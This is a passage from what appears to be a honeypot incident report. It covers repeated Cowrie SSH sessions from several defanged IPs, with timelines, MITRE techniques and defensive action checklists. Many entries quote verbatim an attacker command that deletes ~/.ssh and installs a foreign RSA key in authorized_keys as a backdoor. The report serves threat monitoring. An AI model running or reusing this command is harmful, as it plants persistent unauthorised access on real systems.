| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 03:45:44` | `cowrie.session.connect` |
| `2026-06-15 03:45:44` | `cowrie.client.version` |
| `2026-06-15 03:45:44` | `cowrie.client.kex` |
| `2026-06-15 03:45:45` | `cowrie.login.success` |
| `2026-06-15 03:45:46` | `cowrie.session.params` |
| `2026-06-15 03:45:46` | `cowrie.command.input` |
| `2026-06-15 03:45:46` | `cowrie.command.failed` |
| `2026-06-15 03:45:46` | `cowrie.log.closed` |
| `2026-06-15 03:45:46` | `cowrie.session.params` |
| `2026-06-15 03:45:46` | `cowrie.command.input` |
| `2026-06-15 03:45:47` | `cowrie.session.file_download` |
| `2026-06-15 03:45:47` | `cowrie.log.closed` |
| `2026-06-15 03:45:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.90.100[.]147` to AbuseIPDB if not already reported
- [ ] Block `41.90.100[.]147` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c67281376552

| Field | Detail |
|---|---|
| **Source IP** | `41.90.100[.]147` |
| **First Seen** | 2026-06-15 03:45 |
| **Last Seen** | 2026-06-15 03:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 03:45:49` | `cowrie.session.connect` |
| `2026-06-15 03:45:49` | `cowrie.client.version` |
| `2026-06-15 03:45:50` | `cowrie.client.kex` |
| `2026-06-15 03:45:50` | `cowrie.login.success` |
| `2026-06-15 03:45:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.90.100[.]147` to AbuseIPDB if not already reported
- [ ] Block `41.90.100[.]147` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf376243e734

| Field | Detail |
|---|---|
| **Source IP** | `78.83.249[.]54` |
| **First Seen** | 2026-06-15 03:46 |
| **Last Seen** | 2026-06-15 03:46 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 03:46:40` | `cowrie.session.connect` |
| `2026-06-15 03:46:40` | `cowrie.client.version` |
| `2026-06-15 03:46:41` | `cowrie.client.kex` |
| `2026-06-15 03:46:41` | `cowrie.login.success` |
| `2026-06-15 03:46:42` | `cowrie.session.params` |
| `2026-06-15 03:46:42` | `cowrie.command.input` |
| `2026-06-15 03:46:42` | `cowrie.command.failed` |
| `2026-06-15 03:46:42` | `cowrie.log.closed` |
| `2026-06-15 03:46:43` | `cowrie.session.params` |
| `2026-06-15 03:46:43` | `cowrie.command.input` |
| `2026-06-15 03:46:43` | `cowrie.session.file_download` |
| `2026-06-15 03:46:43` | `cowrie.log.closed` |
| `2026-06-15 03:46:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `78.83.249[.]54` to AbuseIPDB if not already reported
- [ ] Block `78.83.249[.]54` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf7c3dcf7b69

| Field | Detail |
|---|---|
| **Source IP** | `78.83.249[.]54` |
| **First Seen** | 2026-06-15 03:46 |
| **Last Seen** | 2026-06-15 03:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 03:46:45` | `cowrie.session.connect` |
| `2026-06-15 03:46:45` | `cowrie.client.version` |
| `2026-06-15 03:46:46` | `cowrie.client.kex` |
| `2026-06-15 03:46:46` | `cowrie.login.success` |
| `2026-06-15 03:46:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `78.83.249[.]54` to AbuseIPDB if not already reported
- [ ] Block `78.83.249[.]54` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c1ed2c0ebc4

| Field | Detail |
|---|---|
| **Source IP** | `117.102.86[.]226` |
| **First Seen** | 2026-06-15 03:53 |
| **Last Seen** | 2026-06-15 03:53 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 03:53:08` | `cowrie.session.connect` |
| `2026-06-15 03:53:08` | `cowrie.client.version` |
| `2026-06-15 03:53:08` | `cowrie.client.kex` |
| `2026-06-15 03:53:09` | `cowrie.login.success` |
| `2026-06-15 03:53:09` | `cowrie.session.params` |
| `2026-06-15 03:53:09` | `cowrie.command.input` |
| `2026-06-15 03:53:09` | `cowrie.command.failed` |
| `2026-06-15 03:53:10` | `cowrie.log.closed` |
| `2026-06-15 03:53:10` | `cowrie.session.params` |
| `2026-06-15 03:53:10` | `cowrie.command.input` |
| `2026-06-15 03:53:10` | `cowrie.session.file_download` |
| `2026-06-15 03:53:10` | `cowrie.log.closed` |
| `2026-06-15 03:53:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.102.86[.]226` to AbuseIPDB if not already reported
- [ ] Block `117.102.86[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dad721209223

| Field | Detail |
|---|---|
| **Source IP** | `117.102.86[.]226` |
| **First Seen** | 2026-06-15 03:53 |
| **Last Seen** | 2026-06-15 03:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 03:53:12` | `cowrie.session.connect` |
| `2026-06-15 03:53:12` | `cowrie.client.version` |
| `2026-06-15 03:53:12` | `cowrie.client.kex` |
| `2026-06-15 03:53:13` | `cowrie.login.success` |
| `2026-06-15 03:53:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.102.86[.]226` to AbuseIPDB if not already reported
- [ ] Block `117.102.86[.]226` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77ac20c68877

| Field | Detail |
|---|---|
| **Source IP** | `117.102.86[.]226` |
| **First Seen** | 2026-06-15 03:59 |
| **Last Seen** | 2026-06-15 03:59 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 03:59:02` | `cowrie.session.connect` |
| `2026-06-15 03:59:02` | `cowrie.client.version` |
| `2026-06-15 03:59:02` | `cowrie.client.kex` |
| `2026-06-15 03:59:03` | `cowrie.login.success` |
| `2026-06-15 03:59:03` | `cowrie.session.params` |
| `2026-06-15 03:59:03` | `cowrie.command.input` |
| `2026-06-15 03:59:03` | `cowrie.command.failed` |
| `2026-06-15 03:59:03` | `cowrie.log.closed` |
| `2026-06-15 03:59:04` | `cowrie.session.params` |
| `2026-06-15 03:59:04` | `cowrie.command.input` |
| `2026-06-15 03:59:04` | `cowrie.session.file_download` |
| `2026-06-15 03:59:04` | `cowrie.log.closed` |
| `2026-06-15 03:59:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.102.86[.]226` to AbuseIPDB if not already reported
- [ ] Block `117.102.86[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42395c08bab3

| Field | Detail |
|---|---|
| **Source IP** | `117.102.86[.]226` |
| **First Seen** | 2026-06-15 03:59 |
| **Last Seen** | 2026-06-15 03:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 03:59:06` | `cowrie.session.connect` |
| `2026-06-15 03:59:06` | `cowrie.client.version` |
| `2026-06-15 03:59:06` | `cowrie.client.kex` |
| `2026-06-15 03:59:07` | `cowrie.login.success` |
| `2026-06-15 03:59:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.102.86[.]226` to AbuseIPDB if not already reported
- [ ] Block `117.102.86[.]226` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a8d4cf53d31

| Field | Detail |
|---|---|
| **Source IP** | `117.102.86[.]226` |
| **First Seen** | 2026-06-15 04:01 |
| **Last Seen** | 2026-06-15 04:01 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 04:01:07` | `cowrie.session.connect` |
| `2026-06-15 04:01:07` | `cowrie.client.version` |
| `2026-06-15 04:01:07` | `cowrie.client.kex` |
| `2026-06-15 04:01:08` | `cowrie.login.success` |
| `2026-06-15 04:01:08` | `cowrie.session.params` |
| `2026-06-15 04:01:08` | `cowrie.command.input` |
| `2026-06-15 04:01:08` | `cowrie.command.failed` |
| `2026-06-15 04:01:09` | `cowrie.log.closed` |
| `2026-06-15 04:01:09` | `cowrie.session.params` |
| `2026-06-15 04:01:09` | `cowrie.command.input` |
| `2026-06-15 04:01:09` | `cowrie.session.file_download` |
| `2026-06-15 04:01:09` | `cowrie.log.closed` |
| `2026-06-15 04:01:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.102.86[.]226` to AbuseIPDB if not already reported
- [ ] Block `117.102.86[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cadff5ba1360

| Field | Detail |
|---|---|
| **Source IP** | `117.102.86[.]226` |
| **First Seen** | 2026-06-15 04:01 |
| **Last Seen** | 2026-06-15 04:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 04:01:11` | `cowrie.session.connect` |
| `2026-06-15 04:01:11` | `cowrie.client.version` |
| `2026-06-15 04:01:12` | `cowrie.client.kex` |
| `2026-06-15 04:01:12` | `cowrie.login.success` |
| `2026-06-15 04:01:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.102.86[.]226` to AbuseIPDB if not already reported
- [ ] Block `117.102.86[.]226` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26aace188b43

| Field | Detail |
|---|---|
| **Source IP** | `117.102.86[.]226` |
| **First Seen** | 2026-06-15 04:04 |
| **Last Seen** | 2026-06-15 04:05 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 04:04:57` | `cowrie.session.connect` |
| `2026-06-15 04:04:57` | `cowrie.client.version` |
| `2026-06-15 04:04:57` | `cowrie.client.kex` |
| `2026-06-15 04:04:57` | `cowrie.login.success` |
| `2026-06-15 04:04:58` | `cowrie.session.params` |
| `2026-06-15 04:04:58` | `cowrie.command.input` |
| `2026-06-15 04:04:58` | `cowrie.command.failed` |
| `2026-06-15 04:04:58` | `cowrie.log.closed` |
| `2026-06-15 04:04:58` | `cowrie.session.params` |
| `2026-06-15 04:04:58` | `cowrie.command.input` |
| `2026-06-15 04:04:59` | `cowrie.session.file_download` |
| `2026-06-15 04:04:59` | `cowrie.log.closed` |
| `2026-06-15 04:05:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.102.86[.]226` to AbuseIPDB if not already reported
- [ ] Block `117.102.86[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca7dbe32f31f

| Field | Detail |
|---|---|
| **Source IP** | `117.102.86[.]226` |
| **First Seen** | 2026-06-15 04:05 |
| **Last Seen** | 2026-06-15 04:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 04:05:01` | `cowrie.session.connect` |
| `2026-06-15 04:05:01` | `cowrie.client.version` |
| `2026-06-15 04:05:01` | `cowrie.client.kex` |
| `2026-06-15 04:05:02` | `cowrie.login.success` |
| `2026-06-15 04:05:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.102.86[.]226` to AbuseIPDB if not already reported
- [ ] Block `117.102.86[.]226` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-095e9af0b3e4

| Field | Detail |
|---|---|
| **Source IP** | `117.102.86[.]226` |
| **First Seen** | 2026-06-15 04:06 |
| **Last Seen** | 2026-06-15 04:06 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 04:06:51` | `cowrie.session.connect` |
| `2026-06-15 04:06:51` | `cowrie.client.version` |
| `2026-06-15 04:06:51` | `cowrie.client.kex` |
| `2026-06-15 04:06:52` | `cowrie.login.success` |
| `2026-06-15 04:06:53` | `cowrie.session.params` |
| `2026-06-15 04:06:53` | `cowrie.command.input` |
| `2026-06-15 04:06:53` | `cowrie.command.failed` |
| `2026-06-15 04:06:53` | `cowrie.log.closed` |
| `2026-06-15 04:06:53` | `cowrie.session.params` |
| `2026-06-15 04:06:53` | `cowrie.command.input` |
| `2026-06-15 04:06:53` | `cowrie.session.file_download` |
| `2026-06-15 04:06:53` | `cowrie.log.closed` |
| `2026-06-15 04:06:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.102.86[.]226` to AbuseIPDB if not already reported
- [ ] Block `117.102.86[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6115e3445c29

| Field | Detail |
|---|---|
| **Source IP** | `117.102.86[.]226` |
| **First Seen** | 2026-06-15 04:06 |
| **Last Seen** | 2026-06-15 04:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 04:06:56` | `cowrie.session.connect` |
| `2026-06-15 04:06:56` | `cowrie.client.version` |
| `2026-06-15 04:06:56` | `cowrie.client.kex` |
| `2026-06-15 04:06:56` | `cowrie.login.success` |
| `2026-06-15 04:06:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.102.86[.]226` to AbuseIPDB if not already reported
- [ ] Block `117.102.86[.]226` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8374a2627fb2

| Field | Detail |
|---|---|
| **Source IP** | `117.102.86[.]226` |
| **First Seen** | 2026-06-15 04:08 |
| **Last Seen** | 2026-06-15 04:08 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 04:08:52` | `cowrie.session.connect` |
| `2026-06-15 04:08:52` | `cowrie.client.version` |
| `2026-06-15 04:08:53` | `cowrie.client.kex` |
| `2026-06-15 04:08:53` | `cowrie.login.success` |
| `2026-06-15 04:08:54` | `cowrie.session.params` |
| `2026-06-15 04:08:54` | `cowrie.command.input` |
| `2026-06-15 04:08:54` | `cowrie.command.failed` |
| `2026-06-15 04:08:54` | `cowrie.log.closed` |
| `2026-06-15 04:08:54` | `cowrie.session.params` |
| `2026-06-15 04:08:54` | `cowrie.command.input` |
| `2026-06-15 04:08:54` | `cowrie.session.file_download` |
| `2026-06-15 04:08:54` | `cowrie.log.closed` |
| `2026-06-15 04:08:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.102.86[.]226` to AbuseIPDB if not already reported
- [ ] Block `117.102.86[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07ee7f6b1c79

| Field | Detail |
|---|---|
| **Source IP** | `117.102.86[.]226` |
| **First Seen** | 2026-06-15 04:08 |
| **Last Seen** | 2026-06-15 04:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 04:08:57` | `cowrie.session.connect` |
| `2026-06-15 04:08:57` | `cowrie.client.version` |
| `2026-06-15 04:08:57` | `cowrie.client.kex` |
| `2026-06-15 04:08:58` | `cowrie.login.success` |
| `2026-06-15 04:08:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.102.86[.]226` to AbuseIPDB if not already reported
- [ ] Block `117.102.86[.]226` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92e3d11546f2

| Field | Detail |
|---|---|
| **Source IP** | `117.102.86[.]226` |
| **First Seen** | 2026-06-15 04:10 |
| **Last Seen** | 2026-06-15 04:10 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 04:10:48` | `cowrie.session.connect` |
| `2026-06-15 04:10:48` | `cowrie.client.version` |
| `2026-06-15 04:10:49` | `cowrie.client.kex` |
| `2026-06-15 04:10:49` | `cowrie.login.success` |
| `2026-06-15 04:10:50` | `cowrie.session.params` |
| `2026-06-15 04:10:50` | `cowrie.command.input` |
